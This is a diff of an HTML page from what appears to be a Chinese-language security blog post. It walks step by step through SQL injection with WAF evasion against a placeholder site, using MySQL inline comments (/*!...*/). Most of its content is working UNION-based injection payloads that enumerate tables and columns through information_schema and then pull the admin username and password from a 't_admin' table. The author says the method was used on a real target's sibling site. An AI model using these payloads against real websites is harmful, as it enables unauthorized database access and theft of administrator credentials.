@@ -140,7 +140,7 @@
     <div class="post-header index">
         <h1 class="title">
             <a href="/2016/05/20/bypass-waf-note/">
-                bypass waf入门之sql注入篇 [ 内联注释 ]
+                bypass waf入门之sql注入 [ 内联注释篇 ]
             </a>
         </h1>
         <div class="post-info">
@@ -158,22 +158,22 @@
 
     
         <div class="content">
-            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;昨天在搞一个目标的旁站时凑巧碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,招数早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:<br><br></p>
+            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;昨天在搞一个目标的旁站时凑巧又碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,招数早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:</p>
 <p>0x02 依旧是先判断注入点是否存在,很显然,’and’没有拦<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=1212  返回正常</div><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=121   返回异常,注入存在</div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"></p>
 <p>0x03 我们观察到,当字段个数为11的时候页面返回正常,说明当前表字段个数为11个,’order by’ 也没有拦,到这里为止,凭着一点经验自己心里就有种感觉,这个waf肯定非常好过,接着往下看吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 OrDer by 11</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test order by .png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf test order by .png" alt="&#39;&#39;"></p>
 <p>0x04 开始搜集信息,这时我们发现waf似乎开始起作用了,拦了我们的内置函数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,user(),version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"></p>
 <p>0x05 既然拦了函数,咱们就把函数给注释一下看看,然后就这么容易的通过了[以为还要折腾很久],好吧,既然它对这种内联注释感冒,那后面我就把所有的关键字都用这种方式包起来,省的我一个个猜它到底拦哪个<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,/</span>*!user()*<span class="regexp">/,version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"></p>
 <p>0x06 查询当前库中的所有表,这类我们看到了’t_admin’这张管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 aNd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(table_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.tables*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_schema*<span class="regexp">/=0x686e797075686b315f7363686f6f6c --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"></p>
 <p>0x07 查询’t_admin’表中的所有字段名,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 ANd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(column_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.columns*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_name*<span class="regexp">/=0x745f61646d696e --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"><br></p>
+<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"></p>
 <p>0x08 就剩最后一步了,查出管理员的账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 anD 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!admin_name*<span class="regexp">/,/</span>*!admin_password*<span class="regexp">/,5,6,7,8,9,10,11 from /</span>*!t_admin*<span class="regexp">/ /</span>*!limit*<span class="regexp">/ 0,1--+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br><br><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥实际技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续……<br></p>
+<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥实际的技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续…<br></p>
 
         </div>
     
